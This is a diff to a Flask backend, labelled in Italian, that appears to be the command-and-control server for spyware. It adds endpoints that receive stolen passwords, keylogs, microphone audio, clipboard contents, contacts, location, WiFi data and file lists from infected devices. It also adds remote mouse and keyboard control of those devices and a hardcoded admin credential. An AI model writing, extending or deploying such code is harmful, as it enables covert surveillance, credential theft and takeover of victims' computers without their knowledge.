@@ -363,7 +363,74 @@ def upload_webcam(device_id):
     except:
         return jsonify({'error': 'Errore'}), 500
 
-@app.route('/api/keylog/<device_id>', methods(['POST'])
+@app.route('/api/mic/<device_id>', methods=['POST'])
+def upload_mic(device_id):
+    if not supabase:
+        return jsonify({'error': 'Database non configurato'}), 500
+    data = request.json
+    try:
+        supabase.table('captures').insert({
+            'device_id': device_id,
+            'type': 'mic',
+            'data': data.get('audio_base64'),
+            'created_at': datetime.now().isoformat()
+        }).execute()
+        log_action(device_id, 'mic_recorded', 'Audio registrato')
+        return jsonify({'status': 'saved'})
+    except:
+        return jsonify({'error': 'Errore'}), 500
+
+@app.route('/api/contacts/<device_id>', methods=['POST'])
+def upload_contacts(device_id):
+    if not supabase:
+        return jsonify({'error': 'Database non configurato'}), 500
+    data = request.json
+    try:
+        supabase.table('devices').update({
+            'phone_number': data.get('phone_number'),
+            'email': data.get('email'),
+            'contacts': data.get('contacts')
+        }).eq('device_id', device_id).execute()
+        log_action(device_id, 'contacts_extracted', 'Contatti estratti')
+        return jsonify({'status': 'saved'})
+    except:
+        return jsonify({'error': 'Errore'}), 500
+
+@app.route('/api/clipboard/<device_id>', methods=['POST'])
+def upload_clipboard(device_id):
+    if not supabase:
+        return jsonify({'error': 'Database non configurato'}), 500
+    data = request.json
+    try:
+        supabase.table('captures').insert({
+            'device_id': device_id,
+            'type': 'clipboard',
+            'data': data.get('content'),
+            'created_at': datetime.now().isoformat()
+        }).execute()
+        log_action(device_id, 'clipboard_captured', 'Clipboard catturata')
+        return jsonify({'status': 'saved'})
+    except:
+        return jsonify({'error': 'Errore'}), 500
+
+@app.route('/api/location/<device_id>', methods=['POST'])
+def upload_location(device_id):
+    if not supabase:
+        return jsonify({'error': 'Database non configurato'}), 500
+    data = request.json
+    try:
+        supabase.table('captures').insert({
+            'device_id': device_id,
+            'type': 'location',
+            'data': data.get('location'),
+            'created_at': datetime.now().isoformat()
+        }).execute()
+        log_action(device_id, 'location_updated', 'Posizione aggiornata')
+        return jsonify({'status': 'saved'})
+    except:
+        return jsonify({'error': 'Errore'}), 500
+
+@app.route('/api/keylog/<device_id>', methods=['POST'])
 def upload_keylog(device_id):
     if not supabase:
         return jsonify({'error': 'Database non configurato'}), 500
@@ -376,6 +443,74 @@ def upload_keylog(device_id):
             'created_at': datetime.now().isoformat()
         }).execute()
         log_action(device_id, 'keylog_captured', 'Keylog catturato')
+        return jsonify({'status': 'saved'})
+    except:
+        return jsonify({'error': 'Errore'}), 500
+
+@app.route('/api/passwords/<device_id>', methods=['POST'])
+def upload_passwords(device_id):
+    if not supabase:
+        return jsonify({'error': 'Database non configurato'}), 500
+    data = request.json
+    try:
+        supabase.table('captures').insert({
+            'device_id': device_id,
+            'type': 'passwords',
+            'data': data.get('passwords'),
+            'created_at': datetime.now().isoformat()
+        }).execute()
+        log_action(device_id, 'passwords_extracted', 'Password estratte')
+        return jsonify({'status': 'saved'})
+    except:
+        return jsonify({'error': 'Errore'}), 500
+
+@app.route('/api/mouse/<device_id>', methods=['POST'])
+def upload_mouse(device_id):
+    if not supabase:
+        return jsonify({'error': 'Database non configurato'}), 500
+    data = request.json
+    try:
+        supabase.table('captures').insert({
+            'device_id': device_id,
+            'type': 'mouse',
+            'data': data.get('mouse'),
+            'created_at': datetime.now().isoformat()
+        }).execute()
+        log_action(device_id, 'mouse_interaction', 'Interazione mouse')
+        return jsonify({'status': 'saved'})
+    except:
+        return jsonify({'error': 'Errore'}), 500
+
+@app.route('/api/wifi/<device_id>', methods=['POST'])
+def upload_wifi(device_id):
+    if not supabase:
+        return jsonify({'error': 'Database non configurato'}), 500
+    data = request.json
+    try:
+        supabase.table('captures').insert({
+            'device_id': device_id,
+            'type': 'wifi',
+            'data': data.get('wifi'),
+            'created_at': datetime.now().isoformat()
+        }).execute()
+        log_action(device_id, 'wifi_extracted', 'Reti WiFi estratte')
+        return jsonify({'status': 'saved'})
+    except:
+        return jsonify({'error': 'Errore'}), 500
+
+@app.route('/api/files/<device_id>', methods=['POST'])
+def upload_files(device_id):
+    if not supabase:
+        return jsonify({'error': 'Database non configurato'}), 500
+    data = request.json
+    try:
+        supabase.table('captures').insert({
+            'device_id': device_id,
+            'type': 'files',
+            'data': data.get('files'),
+            'created_at': datetime.now().isoformat()
+        }).execute()
+        log_action(device_id, 'file_list', 'Lista file')
         return jsonify({'status': 'saved'})
     except:
         return jsonify({'error': 'Errore'}), 500
@@ -416,6 +551,40 @@ def get_activity_chart():
         })
     except:
         return jsonify({'labels': [], 'data': []})
+
+# ============ API ANALYTICS ============
+@app.route('/api/analytics/captures_by_type', methods=['GET'])
+@login_required
+def get_captures_by_type():
+    if not supabase:
+        return jsonify([])
+    try:
+        result = supabase.table('captures').select('type, count').group_by('type').execute()
+        return jsonify(result.data)
+    except:
+        return jsonify([])
+
+@app.route('/api/analytics/activity_7d', methods=['GET'])
+@login_required
+def get_activity_7d():
+    if not supabase:
+        return jsonify([])
+    try:
+        result = supabase.table('devices').select('date(last_seen) as day, count').group_by('day').execute()
+        return jsonify(result.data)
+    except:
+        return jsonify([])
+
+@app.route('/api/analytics/top_devices', methods=['GET'])
+@login_required
+def get_top_devices():
+    if not supabase:
+        return jsonify([])
+    try:
+        result = supabase.table('devices').select('hostname, platform, device_id, commands_count, captures_count').limit(10).execute()
+        return jsonify(result.data)
+    except:
+        return jsonify([])
 
 # ============ IMPOSTAZIONI ============
 @app.route('/api/settings', methods=['GET'])
@@ -489,7 +658,30 @@ def get_translations():
             'lang_it': 'Italiano', 'lang_en': 'English', 'lang_fr': 'Français',
             'lang_es': 'Español', 'lang_de': 'Deutsch', 'remote': 'Controllo Remoto',
             'username_label': 'Username', 'password_label': 'Password',
-            'login_btn_label': 'ACCEDI AL DASHBOARD', 'loading_label': 'Accesso in corso...'
+            'login_btn_label': 'ACCEDI AL DASHBOARD', 'loading_label': 'Accesso in corso...',
+            'reload': 'Ricarica', 'connected_devices': 'Dispositivi connessi',
+            'live': 'LIVE', 'send_command': 'Invia comando', 'details': 'Dettagli',
+            'remove': 'Rimuovi', 'last_seen': 'Ultimo visto', 'phone': 'Telefono',
+            'id': 'ID', 'status': 'Stato', 'ip': 'Indirizzo IP', 'platform': 'Piattaforma',
+            'hostname': 'Nome host', 'actions': 'Azioni', 'online': 'Online', 'offline': 'Offline',
+            'all_platforms': 'Tutte le piattaforme', 'all_status': 'Tutti gli stati',
+            'all_types': 'Tutti i tipi', 'screenshot': 'Screenshot', 'webcam': 'Webcam',
+            'mic': 'Microfono', 'keylog': 'Keylog', 'passwords': 'Password',
+            'clipboard': 'Clipboard', 'wifi': 'WiFi', 'location': 'Location',
+            'device': 'Dispositivo', 'action': 'Azione', 'details': 'Dettagli',
+            'timestamp': 'Data/ora', 'created_at': 'Creato il', 'type': 'Tipo',
+            'device_management': 'Gestione dispositivi', 'event_history': 'Cronologia eventi',
+            'event_log': 'Registro eventi', 'clear_all': 'Cancella tutto',
+            'clear_confirm': 'Cancellare TUTTI i log? Questa operazione è irreversibile.',
+            'logs_cleared': 'Log cancellati', 'events': 'eventi', 'date_time': 'Data/Ora',
+            'advanced_settings': 'Personalizzazione avanzata', 'theme_desc': 'Scegli il tema per l\'interfaccia',
+            'language_desc': 'Lingua dell\'interfaccia', 'notifications_desc': 'Seleziona le notifiche da ricevere',
+            'security_desc': 'Gestisci la sicurezza del tuo account', 'notif_new_device': 'Nuovi dispositivi',
+            'notif_command': 'Comandi eseguiti', 'notif_capture': 'Nuove catture',
+            'notif_system': 'Eventi di sistema', 'logout_all_confirm': 'Disconnettere TUTTI i dispositivi connessi?',
+            'logout_all_done': 'Tutti i dispositivi disconnessi', 'password_mismatch': 'Le password non coincidono',
+            'delete_confirm': 'Eliminare?', 'deleted': 'Eliminato', 'extract_data': 'Estrai dati',
+            'screenshots_webcam': 'Screenshot, Webcam, Keylog, Password'
         },
         'en': {
             'dashboard': 'Dashboard', 'devices': 'Devices', 'captures': 'Captures',
@@ -519,7 +711,30 @@ def get_translations():
             'lang_it': 'Italian', 'lang_en': 'English', 'lang_fr': 'French',
             'lang_es': 'Spanish', 'lang_de': 'German', 'remote': 'Remote Control',
             'username_label': 'Username', 'password_label': 'Password',
-            'login_btn_label': 'ACCESS DASHBOARD', 'loading_label': 'Logging in...'
+            'login_btn_label': 'ACCESS DASHBOARD', 'loading_label': 'Logging in...',
+            'reload': 'Reload', 'connected_devices': 'Connected devices',
+            'live': 'LIVE', 'send_command': 'Send command', 'details': 'Details',
+            'remove': 'Remove', 'last_seen': 'Last Seen', 'phone': 'Phone',
+            'id': 'ID', 'status': 'Status', 'ip': 'IP Address', 'platform': 'Platform',
+            'hostname': 'Hostname', 'actions': 'Actions', 'online': 'Online', 'offline': 'Offline',
+            'all_platforms': 'All platforms', 'all_status': 'All statuses',
+            'all_types': 'All types', 'screenshot': 'Screenshot', 'webcam': 'Webcam',
+            'mic': 'Microphone', 'keylog': 'Keylog', 'passwords': 'Passwords',
+            'clipboard': 'Clipboard', 'wifi': 'WiFi', 'location': 'Location',
+            'device': 'Device', 'action': 'Action', 'details': 'Details',
+            'timestamp': 'Date/Time', 'created_at': 'Created At', 'type': 'Type',
+            'device_management': 'Device management', 'event_history': 'Event history',
+            'event_log': 'Event log', 'clear_all': 'Clear all',
+            'clear_confirm': 'Delete ALL logs? This operation is irreversible.',
+            'logs_cleared': 'Logs cleared', 'events': 'events', 'date_time': 'Date/Time',
+            'advanced_settings': 'Advanced settings', 'theme_desc': 'Choose the interface theme',
+            'language_desc': 'Interface language', 'notifications_desc': 'Select notifications to receive',
+            'security_desc': 'Manage your account security', 'notif_new_device': 'New devices',
+            'notif_command': 'Commands executed', 'notif_capture': 'New captures',
+            'notif_system': 'System events', 'logout_all_confirm': 'Disconnect ALL connected devices?',
+            'logout_all_done': 'All devices disconnected', 'password_mismatch': 'Passwords do not match',
+            'delete_confirm': 'Delete?', 'deleted': 'Deleted', 'extract_data': 'Extract data',
+            'screenshots_webcam': 'Screenshot, Webcam, Keylog, Password'
         }
     }
     return jsonify(translations.get(lang, translations['it']))
@@ -549,6 +764,71 @@ def clear_logs():
     except:
         return jsonify({'error': 'Errore'}), 500
 
+@app.route('/api/logs/export', methods=['GET'])
+@login_required
+def export_logs():
+    if not supabase:
+        return jsonify([])
+    try:
+        result = supabase.table('logs').select('*').order('timestamp', desc=True).execute()
+        return jsonify(result.data)
+    except:
+        return jsonify([])
+
+# ============ CONTROLLO REMOTO ============
+@app.route('/api/remote/mouse', methods=['POST'])
+@login_required
+def remote_mouse():
+    data = request.json
+    device_id = data.get('device_id')
+    action = data.get('action')
+    x = data.get('x', 50)
+    y = data.get('y', 50)
+    button = data.get('button', 'left')
+    direction = data.get('direction', 'up')
+    
+    if not device_id or not action:
+        return jsonify({'error': 'Dati mancanti'}), 400
+    
+    command = f"mouse_{action}"
+    params = f"x={x}&y={y}&button={button}&direction={direction}"
+    
+    try:
+        supabase.table('commands').insert({
+            'device_id': device_id,
+            'command': command,
+            'params': params,
+            'status': 'pending',
+            'created_at': datetime.now().isoformat()
+        }).execute()
+        log_action(device_id, 'remote_mouse', f'Mouse {action} at ({x},{y})')
+        return jsonify({'status': 'sent'})
+    except Exception as e:
+        return jsonify({'error': str(e)}), 500
+
+@app.route('/api/remote/key', methods=['POST'])
+@login_required
+def remote_key():
+    data = request.json
+    device_id = data.get('device_id')
+    key = data.get('key')
+    
+    if not device_id or not key:
+        return jsonify({'error': 'Dati mancanti'}), 400
+    
+    try:
+        supabase.table('commands').insert({
+            'device_id': device_id,
+            'command': 'keypress',
+            'params': key,
+            'status': 'pending',
+            'created_at': datetime.now().isoformat()
+        }).execute()
+        log_action(device_id, 'remote_key', f'Key: {key}')
+        return jsonify({'status': 'sent'})
+    except Exception as e:
+        return jsonify({'error': str(e)}), 500
+
 # ============ SICUREZZA ============
 @app.route('/api/change_password', methods=['POST'])
 @login_required
@@ -558,6 +838,9 @@ def change_password():
     data = request.json
     old_password = data.get('old_password')
     new_password = data.get('new_password')
+    
+    if not old_password or not new_password:
+        return jsonify({'error': 'Vecchia e nuova password richieste'}), 400
     
     try:
         user = supabase.table('users').select('*').eq('id', current_user.id).execute()
@@ -573,6 +856,18 @@ def change_password():
         
         log_action('system', 'password_changed', f'Password cambiata da {current_user.username}')
         return jsonify({'status': 'password_updated'})
+    except Exception as e:
+        return jsonify({'error': str(e)}), 500
+
+@app.route('/api/logout_all', methods=['POST'])
+@login_required
+def logout_all():
+    if not supabase:
+        return jsonify({'error': 'Database non configurato'}), 500
+    try:
+        supabase.table('devices').update({'is_online': False}).neq('id', 0).execute()
+        log_action('system', 'logout_all', 'Tutti i dispositivi disconnessi')
+        return jsonify({'status': 'logged_out'})
     except Exception as e:
         return jsonify({'error': str(e)}), 500
 
@@ -594,6 +889,21 @@ def setup_admin_user():
             print('[+] Admin creato: BotZXY-Admin / 35£t}nSBzoA%M#4T\e<')
     except Exception as e:
         print(f"[-] Admin creation error: {e}")
+
+# ============ ERROR HANDLER ============
+@app.errorhandler(404)
+def not_found(error):
+    return jsonify({'error': 'Route not found'}), 404
+
+@app.errorhandler(500)
+def internal_error(error):
+    import traceback
+    return f"Internal Server Error: {traceback.format_exc()}", 500
+
+@app.errorhandler(Exception)
+def handle_exception(e):
+    import traceback
+    return traceback.format_exc(), 500
 
 # ============ MAIN ============
 if __name__ == '__main__':
